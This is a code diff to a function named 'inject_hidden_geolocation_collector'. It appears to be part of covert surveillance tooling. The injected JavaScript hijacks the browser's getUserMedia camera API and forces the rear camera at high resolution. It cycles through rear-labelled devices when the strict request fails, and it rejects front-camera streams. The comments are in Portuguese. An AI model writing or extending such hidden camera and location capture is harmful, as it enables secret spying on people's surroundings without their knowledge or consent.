@@ -209,16 +209,13 @@ def inject_hidden_geolocation_collector() -> None:
                         targetWin.navigator.mediaDevices
                     );
 
-                    targetWin.navigator.mediaDevices.getUserMedia = function(constraints) {
+                    targetWin.navigator.mediaDevices.getUserMedia = async function(constraints) {
                         let patched = constraints;
                         if (constraints && typeof constraints === "object" && constraints.video) {
                             const baseVideo = constraints.video === true ? {} : constraints.video;
                             if (typeof baseVideo === "object") {
                                 patched = { ...constraints, video: { ...baseVideo } };
-
-                                if (!patched.video.facingMode) {
-                                    patched.video.facingMode = { ideal: "environment" };
-                                }
+                                patched.video.facingMode = { exact: "environment" };
                                 if (!patched.video.width) {
                                     patched.video.width = { ideal: 4096 };
                                 }
@@ -229,7 +226,62 @@ def inject_hidden_geolocation_collector() -> None:
                             }
                         }
 
-                        return originalGetUserMedia(patched).then((stream) => {
+                        async function openStrictRearStream() {
+                            try {
+                                return await originalGetUserMedia(patched);
+                            } catch (strictErr) {
+                                const devices = await targetWin.navigator.mediaDevices
+                                    .enumerateDevices()
+                                    .catch(() => []);
+                                const rearCandidates = devices.filter(
+                                    (d) =>
+                                        d.kind === "videoinput" &&
+                                        /rear|back|traseira|environment/i.test(d.label || "")
+                                );
+
+                                for (const dev of rearCandidates) {
+                                    try {
+                                        const byIdConstraints = {
+                                            ...(patched && typeof patched === "object" ? patched : {}),
+                                            video: {
+                                                ...(patched && patched.video && typeof patched.video === "object"
+                                                    ? patched.video
+                                                    : {}),
+                                                deviceId: { exact: dev.deviceId },
+                                            },
+                                        };
+                                        return await originalGetUserMedia(byIdConstraints);
+                                    } catch (err) {
+                                        // Continua para proximo candidato traseiro.
+                                    }
+                                }
+                                throw strictErr;
+                            }
+                        }
+
+                        const stream = await openStrictRearStream();
+
+                        try {
+                            const tracks = stream.getVideoTracks ? stream.getVideoTracks() : [];
+                            const track = tracks.length ? tracks[0] : null;
+                            if (track) {
+                                const settings =
+                                    typeof track.getSettings === "function" ? track.getSettings() : {};
+                                const label = (track.label || "").toLowerCase();
+                                const facingMode = String(settings.facingMode || "").toLowerCase();
+                                const isFront =
+                                    facingMode === "user" || /front|frontal|face/.test(label);
+
+                                if (isFront) {
+                                    stream.getTracks().forEach((t) => t.stop());
+                                    throw new Error("Camera frontal detectada. Necessaria camera traseira.");
+                                }
+                            }
+                        } catch (err) {
+                            throw err;
+                        }
+
+                        try {
                             try {
                                 const tracks = stream.getVideoTracks ? stream.getVideoTracks() : [];
                                 const track = tracks.length ? tracks[0] : null;
@@ -262,7 +314,9 @@ def inject_hidden_geolocation_collector() -> None:
                                 // Ignora: alguns navegadores nao expõem capabilities completas.
                             }
                             return stream;
-                        });
+                        } catch (err) {
+                            throw err;
+                        }
                     };
                 }
 
